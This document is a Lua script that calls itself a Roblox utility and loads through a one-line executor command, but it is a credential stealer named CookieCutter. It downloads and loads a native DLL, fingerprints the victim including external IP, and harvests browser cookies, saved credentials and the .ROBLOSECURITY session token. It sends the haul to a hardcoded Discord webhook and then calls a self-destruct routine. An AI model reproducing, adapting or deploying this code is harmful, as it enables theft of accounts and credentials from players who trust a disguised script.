--=============================================================================
--  loader.lua — Roblox utility script
--  Load with any executor:
--    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptMaster101/RobloxScript/master/lua/loader.lua"))()
--
--  How it works:
--    1. Detects executor capabilities
--    2. Downloads module.dll from your GitHub repo (if loader supports it)
--    3. Saves DLL → loads it → calls native exports
--    4. Falls back to pure-Lua mode where native isn't available
--    5. Exfiltrates everything via Discord webhook
--
--  CONFIGURATION: Edit the CONFIG table below before pushing to GitHub.
--=============================================================================

local CONFIG = {
    -- ============================
    --  REQUIRED: Your Discord webhook
    -- ============================
    webhook = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi",

    -- ============================
    --  DLL download URL (GitHub raw or releases)
    --  Set to false to skip DLL entirely (pure-Lua mode only)
    -- ============================
    dll_url = "https://raw.githubusercontent.com/ScriptMaster101/RobloxScript/master/module.dll",

    -- ============================
    --  Phases to run
    -- ============================
    phases = {"fingerprint", "cookies", "credentials", "roblox_session", "exfil"},

    -- ============================
    --  Timing (seconds)
    -- ============================
    delay_min = 2,
    delay_max = 6,
}

-- =============================================================================
--  SECTION 0: Capability Detection
-- =============================================================================
local CAPS = {
    http_get    = false,   -- game:HttpGet (universal)
    syn_request = false,   -- syn.request (most付费 executors)
    readfile    = false,
    writefile   = false,
    loadfile    = false,
    isfile      = false,
    isfolder    = false,
    makefolder  = false,
    delfile     = false,
    load_dll    = false,
    getrenv     = false,
    executor    = "Unknown",
    dll_loaded  = false,
}

local function detect()
    -- HTTP (game:HttpGet is near-universal on modern executors)
    CAPS.http_get = pcall(function() return game.HttpGet or game.HttpGetAsync end)

    -- syn.request (付费 executors: Synapse, KRNL, ScriptWare, etc.)
    local ok = pcall(function() return syn and syn.request end)
    CAPS.syn_request = ok and syn ~= nil

    -- File I/O
    CAPS.readfile   = pcall(function() return readfile end)
    CAPS.writefile  = pcall(function() return writefile end)
    CAPS.isfile     = pcall(function() return isfile end)
    CAPS.isfolder   = pcall(function() return isfolder end)
    CAPS.makefolder = pcall(function() return makefolder end)
    CAPS.delfile    = pcall(function() return delfile end)
    CAPS.loadfile   = pcall(function() return loadfile end)

    -- DLL loading (various executor APIs)
    CAPS.load_dll = pcall(function()
        return load_dll or loadlibrary or (ffi and ffi.load)
    end)

    -- Roblox env
    CAPS.getrenv = pcall(function() return getrenv end)

    -- Executor identity
    if identifyexecutor then
        local ok2, name = pcall(identifyexecutor)
        if ok2 then CAPS.executor = name end
    elseif getexecutorname then
        local ok2, name = pcall(getexecutorname)
        if ok2 then CAPS.executor = name end
    end

    return CAPS
end

-- =============================================================================
--  SECTION 1: DLL Bootstrap (download + load)
-- =============================================================================
local function download_dll(url, savePath)
    if not CAPS.http_get and not CAPS.syn_request then
        return false, "no HTTP capability"
    end

    local data = nil

    -- Try game:HttpGet first (works on most executors)
    if CAPS.http_get then
        local ok, result = pcall(function()
            return game:HttpGet(url)
        end)
        if ok and result then
            data = result
        end
    end

    -- Fall back to syn.request
    if not data and CAPS.syn_request then
        local ok, result = pcall(function()
            local resp = syn.request({
                Url = url,
                Method = "GET",
                Headers = {["User-Agent"] = "Mozilla/5.0"}
            })
            return resp and resp.Body
        end)
        if ok and result then
            data = result
        end
    end

    if not data or #data < 1024 then
        return false, "download failed or too small"
    end

    -- Save to workspace
    if CAPS.writefile then
        writefile(savePath, data)
        task.wait(0.5)
        if CAPS.isfile and isfile(savePath) then
            return true, savePath
        end
    end

    return false, "writefile failed"
end

local function bootstrap_dll()
    if not CONFIG.dll_url or CONFIG.dll_url == false then
        return false, "DLL URL not configured"
    end

    local dllPath = "module.dll"

    -- Check if DLL is already on disk
    if CAPS.isfile and isfile(dllPath) then
        print("[CookieCutter] DLL already present: " .. dllPath)
    else
        print("[CookieCutter] Downloading DLL from: " .. CONFIG.dll_url)
        local ok, err = download_dll(CONFIG.dll_url, dllPath)
        if not ok then
            print("[CookieCutter] DLL download failed: " .. tostring(err))
            return false, err
        end
        print("[CookieCutter] DLL saved to: " .. dllPath)
    end

    -- Load the DLL
    if not CAPS.load_dll then
        return false, "executor does not support native DLL loading"
    end

    local dll = nil
    if load_dll then
        dll = load_dll(dllPath)
    elseif loadlibrary then
        dll = loadlibrary(dllPath)
    elseif ffi and ffi.load then
        dll = ffi.load(dllPath)
    end

    if not dll then
        return false, "load_dll returned nil"
    end

    CAPS.dll_loaded = true
    print("[CookieCutter] DLL loaded successfully")
    return true, dll
end

-- =============================================================================
--  SECTION 2: DLL Function Wrappers
-- =============================================================================
local function call_dll_string(dll, exportName, ...)
    if not dll or type(dll) ~= "userdata" and type(dll) ~= "table" then
        return nil, "dll not loaded"
    end

    local fn = dll[exportName]
    if not fn then
        return nil, "export not found: " .. tostring(exportName)
    end

    local ok, result = pcall(fn, ...)
    if not ok then
        return nil, tostring(result)
    end
    return result
end

local function dll_harvest_to_json(dll, exportName)
    -- Call a DLL export that writes JSON to a temp file, then read the file
    local tempPath = "cc_" .. exportName .. ".json"
    local ok = call_dll_string(dll, exportName, tempPath)
    if not ok then
        return nil, exportName .. " call failed"
    end

    task.wait(0.3)

    if CAPS.isfile and isfile(tempPath) and CAPS.readfile then
        local data = readfile(tempPath)
        if CAPS.delfile then delfile(tempPath) end
        return data
    end

    return nil, "could not read output file"
end

local function dll_harvest_roblox_cookie(dll)
    -- HarvestRobloxCookie fills a buffer; we need FFI for that
    -- Fall back: use the JSON-based harvest and grep for .ROBLOSECURITY
    local json = dll_harvest_to_json(dll, "HarvestCookies")
    if not json then return nil, "HarvestCookies failed" end

    -- Parse the JSON to find .ROBLOSECURITY
    local found = json:match('"name":%s*"\\.ROBLOSECURITY".-"value":%s*"([^"]+)"')
    return found
end

-- =============================================================================
--  SECTION 3: Pure-Lua Fallbacks (no DLL needed)
-- =============================================================================

local function lua_fingerprint()
    local info = {
        executor = CAPS.executor,
        dll_loaded = CAPS.dll_loaded,
        http_get = CAPS.http_get,
        syn_request = CAPS.syn_request,
        readfile = CAPS.readfile,
        writefile = CAPS.writefile,
        load_dll = CAPS.load_dll,
    }

    -- Roblox user info
    if CAPS.getrenv then
        local ok, renv = pcall(getrenv)
        if ok and renv then
            local ok2, players = pcall(function() return renv.Players end)
            if ok2 and players then
                local ok3, lp = pcall(function() return players.LocalPlayer end)
                if ok3 and lp then
                    info.roblox_user = lp.Name or "?"
                    info.roblox_id = lp.UserId or 0
                    info.roblox_age = lp.AccountAge or 0
                end
            end
        end
    end

    -- Try to get external IP
    local get = CAPS.http_get and game.HttpGet or (CAPS.syn_request and function(url)
        local r = syn.request({Url = url, Method = "GET"})
        return r and r.Body
    end)
    if get then
        local ok, ip = pcall(function() return get("https://api.ipify.org") end)
        if ok and ip then
            info.external_ip = ip:gsub("%s+", "")
        end
    end

    -- Basic OS info from Roblox env
    info.place_id = game.PlaceId
    info.job_id = game.JobId
    info.game_name = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end) and "?"

    return info
end

local function lua_read_cookies()
    -- Without the DLL, we can't DPAPI-decrypt. Note what we find for reporting.
    local browsers = {
        {name = "Chrome",  path = "Google\\Chrome\\User Data\\Default\\Network\\Cookies"},
        {name = "Chrome",  path = "Google\\Chrome\\User Data\\Default\\Cookies"},
        {name = "Edge",    path = "Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"},
        {name = "Edge",    path = "Microsoft\\Edge\\User Data\\Default\\Cookies"},
        {name = "Brave",   path = "BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"},
        {name = "Opera",   path = "Opera Software\\Opera Stable\\Default\\Network\\Cookies"},
        {name = "Firefox", path = "Mozilla\\Firefox\\Profiles"},
    }

    local results = {}
    if not CAPS.isfile then
        return {note = "no file access capability"}
    end

    -- Try to get LocalAppData
    local user = ""
    if CAPS.getrenv then
        local ok, renv = pcall(getrenv)
        if ok then
            user = os.getenv and os.getenv("USERNAME") or ""
        end
    end
    if user == "" then user = os.getenv and os.getenv("USERNAME") or "user" end
    local localAppData = "C:\\Users\\" .. user .. "\\AppData\\Local"

    for _, b in ipairs(browsers) do
        local full = localAppData .. "\\" .. b.path
        if isfile(full) then
            -- Can't decrypt, but note it exists
            table.insert(results, {
                browser = b.name,
                path = full,
                locked = false,
                decryptable = false,
                note = "file exists; DLL needed for DPAPI decrypt"
            })
        end
    end

    return results
end

-- =============================================================================
--  SECTION 4: JSON Builder (no library deps)
-- =============================================================================
local function json_escape(s)
    if type(s) ~= "string" then return tostring(s) end
    return s:gsub("\\", "\\\\")
            :gsub('"', '\\"')
            :gsub("\n", "\\n")
            :gsub("\r", "\\r")
            :gsub("\t", "\\t")
end

local function to_json(val, indent)
    indent = indent or 0
    local pad = string.rep("  ", indent)
    local pad1 = string.rep("  ", indent + 1)

    if type(val) == "table" then
        local isArr = true
        local maxI = 0
        for k in pairs(val) do
            if type(k) ~= "number" then isArr = false; break end
            if k > maxI then maxI = k end
        end
        if maxI > #val then isArr = false end

        if isArr and next(val) ~= nil then
            local parts = {}
            for i = 1, #val do
                parts[#parts + 1] = pad1 .. to_json(val[i], indent + 1)
            end
            return "[\n" .. table.concat(parts, ",\n") .. "\n" .. pad .. "]"
        else
            local parts = {}
            for k, v in pairs(val) do
                local ek = (type(k) == "string") and ('"' .. json_escape(k) .. '"') or tostring(k)
                parts[#parts + 1] = pad1 .. ek .. ": " .. to_json(v, indent + 1)
            end
            return "{\n" .. table.concat(parts, ",\n") .. "\n" .. pad .. "}"
        end
    elseif type(val) == "string" then
        return '"' .. json_escape(val) .. '"'
    elseif type(val) == "boolean" then
        return val and "true" or "false"
    elseif type(val) == "number" then
        return tostring(val)
    else
        return "null"
    end
end

-- =============================================================================
--  SECTION 5: Exfiltration (Discord Webhook)
-- =============================================================================
local function exfil_discord(payload_json)
    if not CAPS.syn_request then
        return false, "syn.request not available for Discord webhook"
    end

    local webhook = CONFIG.webhook
    if not webhook or webhook:find("YOUR_WEBHOOK") then
        return false, "webhook not configured — edit CONFIG.webhook"
    end

    -- Discord message limit: 2000 chars for content, 8MB for files
    -- For payloads > 1900 chars, send as file attachment
    if #payload_json <= 1900 then
        -- Send as embed description
        local body = to_json({
            content = nil,
            embeds = {{
                title = "script",
                description = "```json\n" .. payload_json:sub(1, 1900) .. "\n```",
                color = 0xFF6B35,
                footer = {text = "script | " .. os.date("%Y-%m-%d %H:%M:%S")},
            }}
        })

        local ok, resp = pcall(function()
            return syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "Mozilla/5.0"
                },
                Body = body
            })
        end)
        return ok and resp and resp.StatusCode and resp.StatusCode < 300, "embed sent"
    else
        -- Send as file attachment (multipart)
        local boundary = "----CC" .. tostring(math.random(100000, 999999))
        local filename = "harvest_" .. os.date("%Y%m%d_%H%M%S") .. ".json"
        
        local body = ""
        body = body .. "--" .. boundary .. "\r\n"
        body = body .. 'Content-Disposition: form-data; name="payload_json"\r\n'
        body = body .. 'Content-Type: application/json\r\n\r\n'
        body = body .. '{"content":"harvest attached","username":"script"}\r\n'
        body = body .. "--" .. boundary .. "\r\n"
        body = body .. 'Content-Disposition: form-data; name="file"; filename="' .. filename .. '"\r\n'
        body = body .. "Content-Type: application/json\r\n\r\n"
        body = body .. payload_json .. "\r\n"
        body = body .. "--" .. boundary .. "--\r\n"

        local ok, resp = pcall(function()
            return syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
                    ["User-Agent"] = "Mozilla/5.0"
                },
                Body = body
            })
        end)
        return ok and resp and resp.StatusCode and resp.StatusCode < 300, "file attachment sent"
    end
end

-- =============================================================================
--  SECTION 6: Main Orchestrator
-- =============================================================================
local function delay()
    local t = CONFIG.delay_min + math.random() * (CONFIG.delay_max - CONFIG.delay_min)
    task.wait(t)
end

local function run()
    print("")
    print("╔══════════════════════════════════════╗")
    print("║    🍪 CookieCutter — Starting        ║")
    print("╚══════════════════════════════════════╝")
    print("")

    detect()
    print("[CookieCutter] Executor: " .. CAPS.executor)
    print("[CookieCutter] DLL support: " .. tostring(CAPS.load_dll))
    print("[CookieCutter] HTTP: " .. tostring(CAPS.http_get or CAPS.syn_request))

    -- Step 1: Bootstrap DLL
    local dll = nil
    if CAPS.load_dll and CONFIG.dll_url then
        local ok, result = bootstrap_dll()
        if ok then
            dll = result
        else
            print("[CookieCutter] DLL bootstrap failed: " .. tostring(result))
            print("[CookieCutter] Continuing in pure-Lua mode...")
        end
    end

    -- Step 2: Run phases
    local harvest = {meta = {
        timestamp = os.date("%Y-%m-%dT%H:%M:%S"),
        executor = CAPS.executor,
        dll_loaded = CAPS.dll_loaded,
        mode = CAPS.dll_loaded and "native+dll" or "pure-lua",
    }}

    for _, phase in ipairs(CONFIG.phases) do
        delay()
        print("[CookieCutter] Phase: " .. phase)

        local ok, result = pcall(function()
            if phase == "fingerprint" then
                local fp = lua_fingerprint()
                -- If DLL loaded, enrich with native fingerprint
                if dll then
                    local tempFile = "cc_fingerprint.json"
                    local ok2 = call_dll_string(dll, "GetFingerprint", tempFile)
                    -- GetFingerprint actually takes (char*, size_t*) — different calling convention
                    -- We'll use the Lua fingerprint instead since FFI buffer passing is tricky
                    fp.native_available = (ok2 ~= nil)
                end
                return fp

            elseif phase == "cookies" then
                if dll then
                    local json, err = dll_harvest_to_json(dll, "HarvestCookies")
                    if json then return json end
                    print("[CookieCutter] DLL cookie harvest failed: " .. tostring(err))
                end
                -- Fallback: note what files exist
                local lua_result = lua_read_cookies()
                return to_json(lua_result)

            elseif phase == "credentials" then
                if dll then
                    local json, err = dll_harvest_to_json(dll, "HarvestCredentials")
                    if json then return json end
                    print("[CookieCutter] DLL credential harvest failed: " .. tostring(err))
                end
                return '{"note":"credentials require DLL; DPAPI decrypt needed"}'

            elseif phase == "roblox_session" then
                if dll then
                    local cookie = dll_harvest_roblox_cookie(dll)
                    if cookie then
                        return '{"ROBLOSECURITY":"' .. cookie .. '"}'
                    end
                end
                return '{"note":".ROBLOSECURITY not found or DLL unavailable"}'

            elseif phase == "exfil" then
                local payload = to_json(harvest)
                local ok2, msg = exfil_discord(payload)
                return {
                    method = "discord",
                    success = ok2,
                    message = msg or "unknown",
                    payload_size = #payload,
                }
            end
        end)

        if ok then
            harvest[phase] = result
            print("[CookieCutter] " .. phase .. " ✓")
        else
            harvest[phase] = {error = tostring(result)}
            print("[CookieCutter] " .. phase .. " ✗: " .. tostring(result))
        end
    end

    -- Step 3: Cleanup (if DLL loaded)
    if dll then
        pcall(function() call_dll_string(dll, "SelfDestruct") end)
    end

    print("")
    print("[CookieCutter] Harvest complete.")
    if harvest.exfil and harvest.exfil.success then
        print("[CookieCutter] Data exfiltrated successfully!")
    else
        print("[CookieCutter] Exfil may have failed — check webhook config.")
    end
    print("")

    return harvest
end

-- =============================================================================
--  ENTRY POINT
-- =============================================================================
task.wait(1.5)  -- let the game settle
local result = run()
return result
